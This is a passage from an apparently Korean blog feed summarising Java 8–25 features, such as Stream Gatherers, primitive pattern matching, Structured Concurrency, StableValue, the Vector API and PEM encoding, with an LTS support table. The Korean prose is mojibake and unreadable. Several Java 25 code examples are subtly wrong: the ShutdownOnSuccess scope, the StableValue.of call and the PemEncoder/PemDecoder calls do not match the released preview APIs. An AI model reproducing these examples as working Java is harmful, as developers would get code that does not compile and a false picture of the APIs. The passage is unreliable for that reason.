href="#Stream-Gatherers" class="headerlink" title="Stream Gatherers"></a>Stream Gatherers</h3><p>Stream APIì— ì»¤ìŠ¤í…€ ì¤‘ê°„ ì—°ì‚°ì„ ì¶”ê°€í•  ìˆ˜ ìˆëŠ” Gatherers APIê°€ ë„ì…ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ìŠ¬ë¼ì´ë”© ìœˆë„ìš° ì˜ˆì‹œ</span></span><br><span class="line">List&lt;Integer&gt; numbers = List.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; windows = numbers.stream()</span><br><span class="line">    .gather(Gatherers.windowSliding(<span class="number">3</span>))</span><br><span class="line">    .toList();</span><br><span class="line"><span class="comment">// ê²°ê³¼: [[1,2,3], [2,3,4], [3,4,5]]</span></span><br></pre></td></tr></table></figure><hr><h2 id="Java-25-2025ë…„-9ì›”-LTS"><a href="#Java-25-2025ë…„-9ì›”-LTS" class="headerlink" title="Java 25 (2025ë…„ 9ì›”) - LTS"></a>Java 25 (2025ë…„ 9ì›”) - LTS</h2><p>Java 25ëŠ” ìµœì‹  LTS ë²„ì „ìœ¼ë¡œ, AI ê°œë°œ ì§€ì›ê³¼ ì„±ëŠ¥ ê°œì„ ì— ì¤‘ì ì„ ë‘” 18ê°œì˜ JEPê°€ í¬í•¨ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h3 id="Primitive-Types-in-Patterns-ì •ì‹-ê¸°ëŠ¥"><a href="#Primitive-Types-in-Patterns-ì •ì‹-ê¸°ëŠ¥" class="headerlink" title="Primitive Types in Patterns (ì •ì‹ ê¸°ëŠ¥)"></a>Primitive Types in Patterns (ì •ì‹ ê¸°ëŠ¥)</h3><p>primitive íƒ€ì…ì„ í¬í•¨í•œ ì™„ì „í•œ íŒ¨í„´ ë§¤ì¹­ì´ ì •ì‹ ê¸°ëŠ¥ì´ ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ì œ instanceofì™€ switchì—ì„œ ëª¨ë“  primitive íƒ€ì…ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">formatValue</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">switch</span> (obj) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="type">byte</span> b   -&gt; String.format(<span class="string">&quot;byte: %d&quot;</span>, b);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">short</span> s  -&gt; String.format(<span class="string">&quot;short: %d&quot;</span>, s);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">int</span> i    -&gt; String.format(<span class="string">&quot;int: %d&quot;</span>, i);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">long</span> l   -&gt; String.format(<span class="string">&quot;long: %d&quot;</span>, l);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">float</span> f  -&gt; String.format(<span class="string">&quot;float: %.2f&quot;</span>, f);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">double</span> d -&gt; String.format(<span class="string">&quot;double: %.2f&quot;</span>, d);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">char</span> c   -&gt; String.format(<span class="string">&quot;char: %c&quot;</span>, c);</span><br><span class="line">        <span class="keyword">case</span> <span class="type">boolean</span> bool -&gt; String.format(<span class="string">&quot;boolean: %b&quot;</span>, bool);</span><br><span class="line">        <span class="keyword">case</span> String s -&gt; String.format(<span class="string">&quot;String: %s&quot;</span>, s);</span><br><span class="line">        <span class="keyword">default</span>       -&gt; <span class="string">&quot;Unknown type&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Structured-Concurrency-Fifth-Preview"><a href="#Structured-Concurrency-Fifth-Preview" class="headerlink" title="Structured Concurrency (Fifth Preview)"></a>Structured Concurrency (Fifth Preview)</h3><p>êµ¬ì¡°í™”ëœ ë™ì‹œì„± APIê°€ ê³„ì† ê°œì„ ë˜ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">var</span> <span class="variable">scope</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StructuredTaskScope</span>.ShutdownOnSuccess&lt;String&gt;()) &#123;</span><br><span class="line">    scope.fork(() -&gt; fetchFromDatabase());</span><br><span class="line">    scope.fork(() -&gt; fetchFromCache());</span><br><span class="line">    scope.fork(() -&gt; fetchFromAPI());</span><br><span class="line"></span><br><span class="line">    scope.join();</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scope.result();  <span class="comment">// ê°€ì¥ ë¨¼ì € ì„±ê³µí•œ ê²°ê³¼ ë°˜í™˜</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Stable-Values-Preview"><a href="#Stable-Values-Preview" class="headerlink" title="Stable Values (Preview)"></a>Stable Values (Preview)</h3><p>ê°’ë¹„ì‹¼ ê³„ì‚° ê²°ê³¼ë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ê³µìœ í•  ìˆ˜ ìˆëŠ” ìƒˆë¡œìš´ ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. Scoped Valuesì™€ ìœ ì‚¬í•˜ì§€ë§Œ, ë¶ˆë³€ì„±ì„ ë³´ì¥í•˜ê³  ì„±ëŠ¥ì— ìµœì í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> StableValue&lt;HeavyResource&gt; RESOURCE =</span><br><span class="line">    StableValue.of(HeavyResource::<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processData</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">HeavyResource</span> <span class="variable">resource</span> <span class="operator">=</span> RESOURCE.get();</span><br><span class="line">    <span class="comment">// resource ì‚¬ìš©</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Compact-Object-Headers"><a href="#Compact-Object-Headers" class="headerlink" title="Compact Object Headers"></a>Compact Object Headers</h3><p>ê°ì²´ í—¤ë”ë¥¼ ì••ì¶•í•˜ì—¬ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ì„ ì¤„ì´ëŠ” ê¸°ëŠ¥ì´ ì •ì‹ ì˜µì…˜ì´ ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ì œ <code>-XX:+UnlockExperimentalVMOptions</code> í”Œë˜ê·¸ ì—†ì´ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -XX:+UseCompactObjectHeaders MyApplication</span><br></pre></td></tr></table></figure><h3 id="Vector-API-Incubator"><a href="#Vector-API-Incubator" class="headerlink" title="Vector API (Incubator)"></a>Vector API (Incubator)</h3><p>SIMD(Single Instruction Multiple Data) ì—°ì‚°ì„ í™œìš©í•˜ì—¬ ë²¡í„° ì—°ì‚°ì„ ìµœì í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. AIì™€ ë¨¸ì‹ ëŸ¬ë‹ ì›Œí¬ë¡œë“œì— íŠ¹íˆ ìœ ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> VectorSpecies&lt;Float&gt; SPECIES = FloatVector.SPECIES_PREFERRED;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">vectorComputation</span><span class="params">(<span class="type">float</span>[] a, <span class="type">float</span>[] b, <span class="type">float</span>[] c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">upperBound</span> <span class="operator">=</span> SPECIES.loopBound(a.length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; upperBound; i += SPECIES.length()) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">va</span> <span class="operator">=</span> FloatVector.fromArray(SPECIES, a, i);</span><br><span class="line">        <span class="type">var</span> <span class="variable">vb</span> <span class="operator">=</span> FloatVector.fromArray(SPECIES, b, i);</span><br><span class="line">        <span class="type">var</span> <span class="variable">vc</span> <span class="operator">=</span> va.mul(vb);</span><br><span class="line">        vc.intoArray(c, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ë‚˜ë¨¸ì§€ ìš”ì†Œ ì²˜ë¦¬</span></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; a.length; i++) &#123;</span><br><span class="line">        c[i] = a[i] * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Enhanced-JDK-Flight-Recorder"><a href="#Enhanced-JDK-Flight-Recorder" class="headerlink" title="Enhanced JDK Flight Recorder"></a>Enhanced JDK Flight Recorder</h3><p>ë¦¬ëˆ…ìŠ¤ í™˜ê²½ì—ì„œ CPU í”„ë¡œíŒŒì¼ë§ ì •í™•ë„ê°€ í¬ê²Œ ê°œì„ ë˜ì—ˆìŠµë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„±ëŠ¥ ë³‘ëª© ì§€ì ì„ ë” ì •í™•í•˜ê²Œ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h3 id="PEM-Encodings-of-Cryptographic-Objects-Preview"><a href="#PEM-Encodings-of-Cryptographic-Objects-Preview" class="headerlink" title="PEM Encodings of Cryptographic Objects (Preview)"></a>PEM Encodings of Cryptographic Objects (Preview)</h3><p>ì•”í˜¸í™” ê´€ë ¨ ê°ì²´ë¥¼ PEM í˜•ì‹ìœ¼ë¡œ ì‰½ê²Œ ì¸ì½”ë”©í•˜ê³  ë””ì½”ë”©í•  ìˆ˜ ìˆëŠ” APIê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê³µê°œí‚¤ë¥¼ PEM í˜•ì‹ìœ¼ë¡œ ì¸ì½”ë”©</span></span><br><span class="line"><span class="type">PublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> ...;</span><br><span class="line"><span class="type">String</span> <span class="variable">pemEncoded</span> <span class="operator">=</span> PemEncoder.encode(publicKey);</span><br><span class="line"></span><br><span class="line"><span class="comment">// PEM í˜•ì‹ì—ì„œ ê³µê°œí‚¤ ë””ì½”ë”©</span></span><br><span class="line"><span class="type">PublicKey</span> <span class="variable">decoded</span> <span class="operator">=</span> PemDecoder.decodePublicKey(pemEncoded);</span><br></pre></td></tr></table></figure><hr><h2 id="LTS-ë²„ì „-ì •ë¦¬"><a href="#LTS-ë²„ì „-ì •ë¦¬" class="headerlink" title="LTS ë²„ì „ ì •ë¦¬"></a>LTS ë²„ì „ ì •ë¦¬</h2><p>ìë°”ì˜ LTS(Long-Term Support) ë²„ì „ì€ ì¥ê¸°ê°„ ì§€ì›ì„ ë°›ì„ ìˆ˜ ìˆì–´ ê¸°ì—… í™˜ê²½ì—ì„œ ì£¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.</p><ul><li><strong>Java 8</strong> (2014ë…„ 3ì›”): 2030ë…„ê¹Œì§€ ì§€ì› ì˜ˆì •</li><li><strong>Java 11</strong> (2018ë…„ 9ì›”): 2026ë…„ê¹Œì§€ ì§€ì› ì˜ˆì •</li><li><strong>Java 17</strong> (2021ë…„ 9ì›”): 2029ë…„ê¹Œì§€ ì§€ì› ì˜ˆì •</li><li><strong>Java 21</strong> (2023ë…„ 9ì›”): 2031ë…„ê¹Œì§€ ì§€ì› ì˜ˆì •</li><li><strong>Java 25</strong> (2025ë…„ 9ì›”): 2033ë…„ê¹Œì§€ ì§€ì› ì˜ˆì • (ìµœì†Œ 8ë…„ ë³´ì¦)</li></ul><p>LTS ë²„ì „ ì‚¬ì´ì˜ ê°„ê²©ì€ ëŒ€ëµ 2-3ë…„ì´ë©°, ê° LTS ë²„ì „ì€ ìµœì†Œ 8ë…„ê°„ì˜ ìƒì—…ì  ì§€ì›ì„ ë°›ìŠµë‹ˆë‹¤.</p><hr><h2 id="ë²„ì „-ì„ íƒ-ê°€ì´ë“œ"><a href="#ë²„ì „-ì„ íƒ-ê°€ì´ë“œ" class="headerlink" title="ë²„ì „ ì„ íƒ ê°€ì´ë“œ"></a>ë²„ì „ ì„ íƒ ê°€ì´ë“œ</h2><h3 id="ìƒˆë¡œìš´-í”„ë¡œì íŠ¸-ì‹œì‘-ì‹œ"><a href="#ìƒˆë¡œìš´-í”„ë¡œì íŠ¸-ì‹œì‘-ì‹œ" class="headerlink" title="ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ ì‹œì‘ ì‹œ"></a>ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ ì‹œì‘ ì‹œ</h3><p>í˜„ì¬ ì‹œì (2025ë…„)ì—ì„œ ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ë¥¼ ì‹œì‘í•œë‹¤ë©´ <strong>Java 21</strong> ë˜ëŠ” <strong>Java 25</strong>ë¥¼ ì¶”ì²œí•©ë‹ˆë‹¤. ë‘ ë²„ì „ ëª¨ë‘ LTS ë²„ì „ì´ë©°, í˜„ëŒ€ì ì¸ ìë°”ì˜ ëª¨ë“  ê¸°ëŠ¥ì„ í™œìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h3 id="ê¸°ì¡´-í”„ë¡œì íŠ¸-ë§ˆì´ê·¸ë ˆì´ì…˜"><a href="#ê¸°ì¡´-í”„ë¡œì íŠ¸-ë§ˆì´ê·¸ë ˆì´ì…˜" class="headerlink" title="ê¸°ì¡´ í”„ë¡œì íŠ¸ ë§ˆì´ê·¸ë ˆì´ì…˜"></a>ê¸°ì¡´ í”„ë¡œì íŠ¸ ë§ˆì´ê·¸ë ˆì´ì…˜</h3><ul><li><strong>Java 8 â†’ Java 11</strong>: ê°€ì¥ ë§ì´ ì§„í–‰ë˜ëŠ” ë§ˆì´ê·¸ë ˆì´ì…˜ ê²½ë¡œì…ë‹ˆë‹¤. ë¹„êµì  ì•ˆì •ì ì´ê³  ë§ì€ ë ˆí¼ëŸ°ìŠ¤ê°€ ìˆìŠµë‹ˆë‹¤.</li><li><strong>Java 11 â†’ Java 17</strong>: í˜„ì¬ ì§„í–‰ ì¤‘ì¸ ë§ì€ í”„ë¡œì íŠ¸ë“¤ì´ ì„ íƒí•˜ëŠ” ê²½ë¡œì…ë‹ˆë‹¤.</li><li><strong>Java 17 â†’ Java 21</strong>: ê°€ìƒ ìŠ¤ë ˆë“œì™€ ê°™ì€ í˜ì‹ ì ì¸ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ê³  ì‹¶ë‹¤ë©´ ê³ ë ¤í•´ë³¼ ë§Œí•©ë‹ˆë‹¤.</li></ul><h3 id="í•™ìŠµ-ëª©ì "><a href="#í•™ìŠµ-ëª©ì " class="headerlink" title="í•™ìŠµ ëª©ì "></a>í•™ìŠµ ëª©ì </h3><p>ìµœì‹  LTS ë²„ì „ì¸ Java 21ì´ë‚˜ Java 25ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ì¶”ì²œí•©ë‹ˆë‹¤. ìµœì‹  ê¸°ëŠ¥ë“¤ì„ ë°°ìš°ë©´ì„œ ìë°”ì˜ ë°œì „ ë°©í–¥ì„ ì´í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><hr><h2 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h2><p>Java 8ë¶€í„° Java 25ê¹Œì§€ì˜ ë°œì „ ê³¼ì •ì„ ì‚´í´ë³´ì•˜ìŠµë‹ˆë‹¤. ìë°”ëŠ” ëŒë‹¤ì™€ ìŠ¤íŠ¸ë¦¼ìœ¼ë¡œ ì‹œì‘í•´ì„œ Records, Sealed Classes, íŒ¨í„´ ë§¤ì¹­, ê°€ìƒ ìŠ¤ë ˆë“œ ë“± í˜„ëŒ€ì ì¸ í”„ë¡œê·¸ë˜ë° íŒ¨ëŸ¬ë‹¤ì„ì„ ì§€ì†ì ìœ¼ë¡œ ë„ì…í•´ì™”ìŠµë‹ˆë‹¤.</p><p>íŠ¹íˆ ìµœê·¼ì˜ ìë°”ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë°©í–¥ìœ¼ë¡œ ë°œì „í•˜ê³  ìˆìŠµë‹ˆë‹¤:</p><ol><li><strong>ì½”ë“œ ê°„ê²°ì„±</strong>: Records, íŒ¨í„´ ë§¤ì¹­, var ë“±ìœ¼ë¡œ ë³´ì¼ëŸ¬í”Œë ˆì´íŠ¸ ì½”ë“œ ê°ì†Œ</li><li><strong>ì„±ëŠ¥ ê°œì„ </strong>: ê°€ìƒ ìŠ¤ë ˆë“œ, Vector API ë“±ìœ¼ë¡œ ë™ì‹œì„±ê³¼ ì—°ì‚° ì„±ëŠ¥ í–¥ìƒ</li><li><strong>ì•ˆì „ì„± ê°•í™”</strong>: Sealed Classes, ê°œì„ ëœ Null ì²˜ë¦¬ ë“±ìœ¼ë¡œ íƒ€ì… ì•ˆì „ì„± í–¥ìƒ</li><li><strong>ê°œë°œì ê²½í—˜</strong>: Text Blocks, Switch í‘œí˜„ì‹ ë“±ìœ¼ë¡œ ê°€ë…ì„±ê³¼ ìƒì‚°ì„± í–¥ìƒ</li><li><strong>AI ì§€ì›</strong>: Vector API, ìµœì í™”ëœ ë©”ëª¨ë¦¬ ê´€ë¦¬ ë“± AI&#x2F;ML ì›Œí¬ë¡œë“œ ì§€ì›</li></ol><p>ìë°”ëŠ” ì—¬ì „íˆ í™œë°œí•˜ê²Œ ë°œì „í•˜ê³  ìˆìœ¼ë©°, 6ê°œì›”ë§ˆë‹¤ ìƒˆë¡œìš´ ë²„ì „ì„ ì¶œì‹œí•˜ë©´ì„œ í˜„ëŒ€ì ì¸ í”„ë¡œê·¸ë˜ë° ì–¸ì–´ë¡œì„œì˜ ê²½ìŸë ¥ì„ ìœ ì§€í•˜ê³  ìˆìŠµë‹ˆë‹¤. LTS ë²„ì „ì„ ì¤‘ì‹¬ìœ¼ë¡œ ì•ˆì •ì„±ì„ ìœ ì§€í•˜ë©´ì„œë„, í˜ì‹ ì ì¸ ê¸°ëŠ¥ë“¤ì„ ë¹ ë¥´ê²Œ ë„ì…í•˜ëŠ” ì „ëµì€ ì•ìœ¼ë¡œë„ ê³„ì†ë  ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Develop/">Develop</category>
      
      <category domain="https://ckck803.github.io/categories/Develop/JAVA/">JAVA</category>
      
      
      <category domain="https://ckck803.github.io/tags/Java/">Java</category>
      
      <category domain="https://ckck803.github.io/tags/Version-History/">Version History</category>
      
      <category domain="https://ckck803.github.io/tags/JDK/">JDK</category>
      
      
      <comments>https://ckck803.github.io/2025/11/27/java/java-version-history/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>JAVA - ë²„ì „ë³„ ì£¼ìš” íŠ¹ì§•ê³¼ ì˜ˆì‹œ</title>
      <link>https://ckck803.github.io/2025/11/27/java/jwt/java-version-highlights/</link>
      <guid>https://ckck803.github.io/2025/11/27/java/jwt/java-version-highlights/</guid>
      <pubDate>Wed, 26 Nov 2025 17:05:30 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/java/java.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ì •ë¦¬-ê¸°ì¤€&quot;&gt;&lt;a href=&quot;#ì •ë¦¬-ê¸°ì¤€&quot; class=&quot;headerlink&quot; title=&quot;ì •ë¦¬ ê¸°ì¤€&quot;&gt;&lt;/a&gt;ì •ë¦¬ ê¸°ì¤€&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ìë°” 8ë¶€í„° 25ê¹Œì§€ì˜ íë¦„ì„ LTS ìœ„ì£¼ë¡œ ë¬¶ê³ , ë¯¸ë¦¬ë³´ê¸°&amp;#x2F;ì¸íë² ì´í„° ìƒíƒœë¥¼ í•¨ê»˜ í‘œê¸°í–ˆë‹¤.&lt;/li&gt;
&lt;li&gt;ì½”ë“œ ì˜ˆì œëŠ” í•´ë‹¹ ë²„ì „ì—ì„œ ë™ì‘í•˜ë„ë¡ ì‘ì„±í–ˆê³ , ë¯¸ë¦¬ë³´ê¸° ê¸°ëŠ¥ì€ &lt;code&gt;--enable-preview&lt;/code&gt; í”Œë˜ê·¸ê°€ í•„ìš”í•˜ë‹¤.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Java-8-2014-LTS&quot;&gt;&lt;a href=&quot;#Java-8-2014-LTS&quot; class=&quot;headerlink&quot; title=&quot;Java 8 (2014, LTS)&quot;&gt;&lt;/a&gt;Java 8 (2014, LTS)&lt;/h2&gt;&lt;p&gt;ëŒë‹¤, Stream API, &lt;code&gt;Optional&lt;/code&gt;, ìƒˆë¡œìš´ &lt;code&gt;java.time&lt;/code&gt; íŒ¨í‚¤ì§€ê°€ ë“±ì¥í•´ í•¨ìˆ˜í˜• ìŠ¤íƒ€ì¼ê³¼ ì•ˆì „í•œ ì‹œê°„ ì²˜ë¦¬ì˜ ê¸°ë°˜ì´ ë§ˆë ¨ë˜ì—ˆë‹¤. ì¸í„°í˜ì´ìŠ¤ì— &lt;code&gt;default&lt;/code&gt;&amp;#x2F;&lt;code&gt;static&lt;/code&gt; ë©”ì„œë“œë¥¼ ë‘˜ ìˆ˜ ìˆì–´ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì§„í™”ë„ ì‰¬ì›Œì¡Œë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;List&amp;lt;String&amp;gt; names = Arrays.asList(&lt;span class=&quot;string&quot;&gt;&amp;quot;Java&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;Kotlin&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;Scala&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;List&amp;lt;String&amp;gt; upper = names.stream()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .filter(s -&amp;gt; s.startsWith(&lt;span class=&quot;string&quot;&gt;&amp;quot;J&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .map(String::toUpperCase)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .collect(Collectors.toList());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;Java-9-2017&quot;&gt;&lt;a href=&quot;#Java-9-2017&quot; class=&quot;headerlink&quot; title=&quot;Java 9 (2017)&quot;&gt;&lt;/a&gt;Java 9 (2017)&lt;/h2&gt;&lt;p&gt;í”„ë¡œì íŠ¸ ì§€ê·¸ì†Œë¡œ JDK ìì²´ì™€ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ëª¨ë“ˆí™”í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆê³ , JShell ë•ë¶„ì— REPL ì‹¤í—˜ì´ í¸í•´ì¡Œë‹¤. HTTP í´ë¼ì´ì–¸íŠ¸ê°€ ì¸íë² ì´í„°ë¡œ ê³µê°œë˜ì–´ ì´í›„ í‘œì¤€í™”ì˜ ë°œíŒì„ ë§ˆë ¨í–ˆë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// module-info.java&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;module&lt;/span&gt; com.example.app &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;requires&lt;/span&gt; com.example.service;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;exports&lt;/span&gt; com.example.app.api;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;Java-10-2018&quot;&gt;&lt;a href=&quot;#Java-10-2018&quot; class=&quot;headerlink&quot; title=&quot;Java 10 (2018)&quot;&gt;&lt;/a&gt;Java 10 (2018)&lt;/h2&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/java/java.png"></p><h2 id="ì •ë¦¬-ê¸°ì¤€"><a href="#ì •ë¦¬-ê¸°ì¤€" class="headerlink" title="ì •ë¦¬ ê¸°ì¤€"></a>ì •ë¦¬ ê¸°ì¤€</h2><ul><li>ìë°” 8ë¶€í„° 25ê¹Œì§€ì˜ íë¦„ì„ LTS ìœ„ì£¼ë¡œ ë¬¶ê³ , ë¯¸ë¦¬ë³´ê¸°&#x2F;ì¸íë² ì´í„° ìƒíƒœë¥¼ í•¨ê»˜ í‘œê¸°í–ˆë‹¤.</li><li>ì½”ë“œ ì˜ˆì œëŠ” í•´ë‹¹ ë²„ì „ì—ì„œ ë™ì‘í•˜ë„ë¡ ì‘ì„±í–ˆê³ , ë¯¸ë¦¬ë³´ê¸° ê¸°ëŠ¥ì€ <code>--enable-preview</code> í”Œë˜ê·¸ê°€ í•„ìš”í•˜ë‹¤.</li></ul><h2 id="Java-8-2014-LTS"><a href="#Java-8-2014-LTS" class="headerlink" title="Java 8 (2014, LTS)"></a>Java 8 (2014, LTS)</h2><p>ëŒë‹¤, Stream API, <code>Optional</code>, ìƒˆë¡œìš´ <code>java.time</code> íŒ¨í‚¤ì§€ê°€ ë“±ì¥í•´ í•¨ìˆ˜í˜• ìŠ¤íƒ€ì¼ê³¼ ì•ˆì „í•œ ì‹œê°„ ì²˜ë¦¬ì˜ ê¸°ë°˜ì´ ë§ˆë ¨ë˜ì—ˆë‹¤. ì¸í„°í˜ì´ìŠ¤ì— <code>default</code>&#x2F;<code>static</code> ë©”ì„œë“œë¥¼ ë‘˜ ìˆ˜ ìˆì–´ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì§„í™”ë„ ì‰¬ì›Œì¡Œë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;Java&quot;</span>, <span class="string">&quot;Kotlin&quot;</span>, <span class="string">&quot;Scala&quot;</span>);</span><br><span class="line">List&lt;String&gt; upper = names.stream()</span><br><span class="line">    .filter(s -&gt; s.startsWith(<span class="string">&quot;J&quot;</span>))</span><br><span class="line">    .map(String::toUpperCase)</span><br><span class="line">    .collect(Collectors.toList());</span><br></pre></td></tr></table></figure><h2 id="Java-9-2017"><a href="#Java-9-2017" class="headerlink" title="Java 9 (2017)"></a>Java 9 (2017)</h2><p>í”„ë¡œì íŠ¸ ì§€ê·¸ì†Œë¡œ JDK ìì²´ì™€ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ëª¨ë“ˆí™”í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆê³ , JShell ë•ë¶„ì— REPL ì‹¤í—˜ì´ í¸í•´ì¡Œë‹¤. HTTP í´ë¼ì´ì–¸íŠ¸ê°€ ì¸íë² ì´í„°ë¡œ ê³µê°œë˜ì–´ ì´í›„ í‘œì¤€í™”ì˜ ë°œíŒì„ ë§ˆë ¨í–ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// module-info.java</span></span><br><span class="line"><span class="keyword">module</span> com.example.app &#123;</span><br><span class="line">    <span class="keyword">requires</span> com.example.service;</span><br><span class="line">    <span class="keyword">exports</span> com.example.app.api;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-10-2018"><a href="#Java-10-2018" class="headerlink" title="Java 10 (2018)"></a>Java 10 (2018)</h2><p>ì§€ì—­ ë³€ìˆ˜ íƒ€ì… ì¶”ë¡  <code>var</code>ê°€ ì¶”ê°€ë˜ì–´ ì„ ì–¸ì€ ê°„ê²°í•´ì¡Œì§€ë§Œ, ì œë„¤ë¦­ íƒ€ì… ì •ë³´ëŠ” ì»´íŒŒì¼ íƒ€ì„ì— ìœ ì§€ëœë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Integer&gt;();</span><br><span 